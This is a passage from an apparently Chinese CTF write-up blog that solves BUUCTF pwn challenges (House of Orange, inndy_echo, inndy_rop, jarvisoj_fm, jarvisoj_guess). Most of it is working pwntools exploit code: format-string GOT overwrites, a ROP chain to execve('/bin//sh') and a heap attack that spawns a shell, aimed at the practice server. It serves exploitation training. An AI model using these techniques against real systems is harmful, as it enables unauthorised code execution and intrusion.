p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">sz,text</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(sz))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,text)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line"><span class="comment">#------------House_of_orange------------</span></span><br><span class="line">	add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">	payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf81</span>)</span><br><span class="line">	edit(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">	add(<span class="number">0x1000</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">	add(<span class="number">0x400</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">	see()</span><br><span class="line">	leak = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">	log.success(<span class="string">&quot;leak add =&gt; 0x%x&quot;</span>,leak)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------Unsoted_bin leak------------</span></span><br><span class="line">	libc_base = leak-<span class="number">0x3c510a</span></span><br><span class="line">	system_addr = libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">	binsh = libc_base+libc.search(<span class="string">&quot;/bin/sh\x00&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">	IO_list_all = libc_base+libc.sym[<span class="string">&quot;_IO_list_all&quot;</span>]</span><br><span class="line">	IO_str_jumps = libc.symbols[<span class="string">&quot;_IO_file_jumps&quot;</span>]+<span class="number">0xc0</span>+libc_base</span><br><span class="line"></span><br><span class="line">	log.success(<span class="string">&quot;libc base =&gt; 0x%x&quot;</span>,libc_base)</span><br><span class="line">	log.success(<span class="string">&quot;system addr =&gt; 0x%x&quot;</span>,system_addr)</span><br><span class="line">	log.success(<span class="string">&quot;IO list all =&gt; 0x%x&quot;</span>,IO_list_all)</span><br><span class="line">	log.success(<span class="string">&quot;IO str jump =&gt; 0x%x&quot;</span>,IO_str_jumps)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------Fake FILE------------</span></span><br><span class="line">	payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x400</span></span><br><span class="line">	payload += p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">	fake_file =	p64(<span class="number">0</span>)+p64(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#利用unsorted bin attack将 _IO_list_all修改为main_arena+0x58(即&amp;unsorted_bin+0x10)</span></span><br><span class="line">	fake_file += p64(<span class="number">0</span>)+p64(IO_list_all-<span class="number">0x10</span>)</span><br><span class="line">	fake_file += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">	fake_file += p64(<span class="number">0</span>)+p64(binsh)</span><br><span class="line"></span><br><span class="line">	fake_file = fake_file.ljust(<span class="number">0xc0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">	payload += fake_file</span><br><span class="line">	payload += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">	payload += p64(IO_str_jumps-<span class="number">0x8</span>)</span><br><span class="line">	payload += p64(<span class="number">0</span>)</span><br><span class="line">	payload += p64(system_addr)	<span class="comment">#jump2here</span></span><br><span class="line">	edit(<span class="number">0x800</span>,payload)</span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	connect(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29891</span>,<span class="number">1</span>)</span><br><span class="line">	pwn()</span><br></pre></td></tr></table></figure>
<h2 id="inndy_echo"><a class="markdownIt-Anchor" href="#inndy_echo"></a> inndy_echo</h2>
<h3 id="1checksec-45"><a class="markdownIt-Anchor" href="#1checksec-45"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-44"><a class="markdownIt-Anchor" href="#2ida-44"></a> 2.IDA</h3>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [esp+Ch] [ebp-10Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+10Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    fgets(&amp;s, <span class="number">0x100</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(&amp;s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="built_in">strcmp</span>(&amp;s, <span class="string">&quot;exit\n&quot;</span>) );</span><br><span class="line">  system(<span class="string">&quot;echo Goodbye&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>字符串格式化漏洞，没有栈溢出，利用任意地址写把<code>printf@got</code>改为<code>system@plt</code></p>
</blockquote>
<h3 id="3exp-32"><a class="markdownIt-Anchor" href="#3exp-32"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./echo&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="string">&quot;29921&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_got_addr = elf.got[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">system_plt_addr = elf.plt[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>,&#123;printf_got_addr: system_plt_addr&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&quot;$0&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="inndy_rop"><a class="markdownIt-Anchor" href="#inndy_rop"></a> inndy_rop</h2>
<h3 id="1checksec-46"><a class="markdownIt-Anchor" href="#1checksec-46"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-45"><a class="markdownIt-Anchor" href="#2ida-45"></a> 2.IDA</h3>
<p><strong>overflow</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">overflow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(&amp;v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>函数复杂，有溢出，直接自动生成ropchain</p>
</blockquote>
<h3 id="3exp-33"><a class="markdownIt-Anchor" href="#3exp-33"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#q = process(&#x27;./rop&#x27;)</span></span><br><span class="line">q = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="string">&quot;28171&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload</span>():</span><br><span class="line">    p = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xc</span> + <span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">    p += <span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">    p += <span class="string">&#x27;//sh&#x27;</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de769</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806c943</span>) <span class="comment"># int 0x80</span></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line">shell = payload()</span><br><span class="line">q.sendline(shell)</span><br><span class="line">q.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="jarvisoj_fm"><a class="markdownIt-Anchor" href="#jarvisoj_fm"></a> jarvisoj_fm</h2>
<h3 id="1checksec-47"><a class="markdownIt-Anchor" href="#1checksec-47"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-46"><a class="markdownIt-Anchor" href="#2ida-46"></a> 2.IDA</h3>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [esp+2Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+7Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  be_nice_to_people();</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x50</span>u);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x50</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d!\n&quot;</span>, x);</span><br><span class="line">  <span class="keyword">if</span> ( x == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;running sh...&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>利用字符串格式化漏洞改<code>x</code>为<code>4</code></p>
</blockquote>
<h3 id="3exp-34"><a class="markdownIt-Anchor" href="#3exp-34"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#p = remote(&quot;node3.buuoj.cn&quot;,26472)</span></span><br><span class="line">p = process(<span class="string">&quot;./fm&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./fm&quot;</span>)</span><br><span class="line">x_addr = <span class="number">0x0804A02C</span></span><br><span class="line">payload = p32(x_addr)+<span class="string">&quot;%11$n&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="jarvisoj_guess"><a class="markdownIt-Anchor" href="#jarvisoj_guess"></a> jarvisoj_guess</h2>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/pashanhu6402/article/details/96428887">Socket原理讲解</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/106694793">下标越界导致盲注</a></p>
<h3 id="1checksec-48"><a class="markdownIt-Anchor" href="#1checksec-48"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-47"><a class="markdownIt-Anchor" href="#2ida-47"></a> 2.IDA</h3>
<p><strong>is_flag_correct</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">  qmemcpy(bin_by_hex, &amp;unk_401100, <span class="keyword">sizeof</span>(bin_by_hex));</span><br><span class="line">  qmemcpy(flag, <span class="string">&quot;FAKE&#123;9b355e394d2070ebd0df195d8b234509cc29272bc412&#125;&quot;</span>, <span class="keyword">sizeof</span>(flag));</span><br><span class="line">  bzero(given_flag, <span class="number">0x32</span>uLL);  </span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    value1 = bin_by_hex[flag_hex[<span class="number">2</span> * i]];</span><br><span class="line">    value2 = bin_by_hex[flag_hex[<span class="number">2</span> * i + <span class="number">1</span>]];</span><br><span class="line">    <span class="keyword">if</span> ( value1 == <span class="number">-1</span> || value2 == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;bad input – one of the characters you supplied was not a valid hex character!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    given_flag[i] = value2 | <span class="number">16</span> * value1;</span><br><span class="line">  &#125;</span><br><span class="line">  diff = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i_0 = <span class="number">0</span>; i_0 &lt;= <span class="number">49</span>; ++i_0 )</span><br><span class="line">    diff |= flag[i_0] ^ given_flag[i_0];</span><br><span class="line">  <span class="keyword">return</span> diff == <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>其中 <strong>flag</strong> 是之前 <code>qmemcpy</code>过后的，<strong>given_flag</strong>是通过 <strong>value_1</strong> 和 <strong>value_2</strong> 的值计算来的，而这两个值是由我们输入的flag决定，如果控制 <strong>flag_hex[2 * i]</strong> 为负数，就可以flag结果修改为正确的flag结果，这样就可以通过后面的检测了</p>
<p><strong>is_flag_correct -&gt; stack</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">-00000000000001A0</span><br><span class="line">-00000000000001A0                 db ? ; undefined</span><br><span class="line">-000000000000019F                 db ? ; undefined</span><br><span class="line">-000000000000019E                 db ? ; undefined</span><br><span class="line">-000000000000019D                 db ? ; undefined</span><br><span class="line">-000000000000019C                 db ? ; undefined</span><br><span class="line">-000000000000019B                 db ? ; undefined</span><br><span class="line">-000000000000019A                 db ? ; undefined</span><br><span class="line">-0000000000000199                 db ? ; undefined</span><br><span class="line">-0000000000000198 flag_hex        dq ?                    ; offset</span><br><span class="line">-0000000000000190 given_flag      db 50 dup(?)</span><br><span class="line">-000000000000015E                 db ? ; undefined</span><br><span class="line">-000000000000015D                 db ? ; undefined</span><br><span class="line">-000000000000015C                 db ? ; undefined</span><br><span class="line">-000000000000015B                 db ? ; undefined</span><br><span class="line">-000000000000015A                 db ? ; undefined</span><br><span class="line">-0000000000000159                 db ? ; undefined</span><br><span class="line">-0000000000000158                 db ? ; undefined</span><br><span class="line">-0000000000000157                 db ? ; undefined</span><br><span class="line">-0000000000000156                 db ? ; undefined</span><br><span class="line">-0000000000000155                 db ? ; undefined</span><br><span class="line">-0000000000000154                 db ? ; undefined</span><br><span class="line">-0000000000000153                 db ? ; undefined</span><br><span class="line">-0000000000000152                 db ? ; undefined</span><br><span class="line">-0000000000000151                 db ? ; undefined</span><br><span class="line">-0000000000000150 flag            db 50 dup(?)</span><br><span class="line">-000000000000011E                 db ? ; undefined</span><br><span class="line">-000000000000011D                 db ? ; undefined</span><br><span class="line">-000000000000011C                 db ? ; undefined</span><br><span class="line">-000000000000011B                 db ? ; undefined</span><br><span class="line">-000000000000011A                 db ? ; undefined</span><br><span class="line">-0000000000000119                 db ? ; undefined</span><br><span class="line">-0000000000000118                 db ? ; undefined</span><br><span class="line">-0000000000000117                 db ? ; undefined</span><br><span class="line">-0000000000000116                 db ? ; undefined</span><br><span class="line">-0000000000000115                 db ? ; undefined</span><br><span class="line">-0000000000000114                 db ? ; undefined</span><br><span class="line">-0000000000000113                 db ? ; undefined</span><br><span class="line">-0000000000000112                 db ? ; undefined</span><br><span class="line">-0000000000000111                 db ? ; undefined</span><br><span class="line">-0000000000000110 bin_by_hex      db 256 dup(?)</span><br><span class="line">-0000000000000010                 db ? ; undefined</span><br><span class="line">-000000000000000F                 db ? ; undefined</span><br><span class="line">-000000000000000E value2          db ?</span><br><span class="line">-000000000000000D value1          db ?</span><br><span class="line">-000000000000000C i_0             dd ?</span><br><span class="line">-0000000000000008                 db ? ; undefined</span><br><span class="line">-0000000000000007                 db ? ; undefined</span><br><span class="line">-0000000000000006                 db ? ; undefined</span><br><span class="line">-0000000000000005 diff            db ?</span><br><span class="line">-0000000000000004 i               dd ?</span><br><span class="line">+0000000000000000  s              db 8 dup(?)</span><br><span class="line">+0000000000000008  r              db 8 dup(?)</span><br><span class="line">+0000000000000010</span><br><span class="line">+0000000000000010 ; end of stack variables</span><br></pre></td></tr></table></figure>
<p>char的范围一般是0~255，这里有整数溢出，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>190</mn><mo>+</mo><mi mathvariant="normal">∣</mi><mo>−</mo><mn>66</mn><mi mathvariant="normal">∣</mi><mo>=</mo><mn>256</mn></mrow><annotation encoding="application/x-tex">190+|-66|=256</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">9</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">6</span><span class="mord">6</span><span class="mord">∣</span><span class="mspace" 